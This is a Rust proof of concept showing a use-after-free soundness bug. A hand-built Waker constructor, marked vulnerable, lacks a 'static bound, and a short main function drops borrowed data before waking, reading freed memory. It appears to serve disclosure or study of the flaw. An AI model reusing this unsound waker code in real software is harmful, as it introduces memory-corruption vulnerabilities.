// SECTION 1: MINIMAL DEPENDENCIES

use std::sync::Arc;
use std::task::{RawWaker, RawWakerVTable, Waker};
use std::mem;

pub trait ArcWake: Send + Sync {
    fn wake(self: Arc<Self>) {
        Self::wake_by_ref(&self)
    }

    fn wake_by_ref(arc_self: &Arc<Self>);
}

#[allow(clippy::redundant_clone)]
unsafe fn increase_refcount<T: ArcWake>(data: *const ()) {
    let arc = mem::ManuallyDrop::new(Arc::<T>::from_raw(data as *const T));
    let _arc_clone: mem::ManuallyDrop<_> = arc.clone();
}

unsafe fn clone_arc_raw<T: ArcWake>(data: *const ()) -> RawWaker {
    increase_refcount::<T>(data);
    RawWaker::new(data, waker_vtable::<T>())
}

unsafe fn wake_arc_raw<T: ArcWake>(data: *const ()) {
    let arc: Arc<T> = Arc::from_raw(data as *const T);
    ArcWake::wake(arc);
}

unsafe fn wake_by_ref_arc_raw<T: ArcWake>(data: *const ()) {
    let arc = mem::ManuallyDrop::new(Arc::<T>::from_raw(data as *const T));
    ArcWake::wake_by_ref(&arc);
}

unsafe fn drop_arc_raw<T: ArcWake>(data: *const ()) {
    drop(Arc::<T>::from_raw(data as *const T))
}

// CORRECTED: Removed `pub(super)` as it's not applicable in a single-file binary.
fn waker_vtable<W: ArcWake>() -> &'static RawWakerVTable {
    &RawWakerVTable::new(
        clone_arc_raw::<W>,
        wake_arc_raw::<W>,
        wake_by_ref_arc_raw::<W>,
        drop_arc_raw::<W>,
    )
}


// SECTION 2: VULNERABLE CODE

pub fn waker<W>(wake: Arc<W>) -> Waker
where
    W: ArcWake,
{
    let ptr = Arc::into_raw(wake) as *const ();

    unsafe {
        Waker::from_raw(RawWaker::new(ptr, waker_vtable::<W>()))
    }
}


// SECTION 3: PROOF-OF-CONCEPT

struct MyRef<'a> {
    a: &'a str,
}

impl<'a> ArcWake for MyRef<'a> {
    fn wake_by_ref(arc_self: &Arc<Self>) {
        // This access triggers the Use-After-Free.
        // It may print garbage data or cause a segmentation fault.
        println!("{}", arc_self.a);
    }
}

fn main() {
    // 1. Setup an object (`string`) with a lifetime constrained to this scope.
    let string = "Hello World!".to_string();
    let my_waker_data = Arc::new(MyRef { a: &string });

    // 2. Trigger the vulnerability by creating a Waker that incorrectly
    // allows a non-'static reference to be stored.
    let waker = waker(my_waker_data);

    // 3. Drop the original data, creating a dangling reference inside the waker.
    drop(string);

    // 4. Call `wake()`, which reads the freed memory via `wake_by_ref`.
    // This will likely cause a segmentation fault.
    waker.wake();
}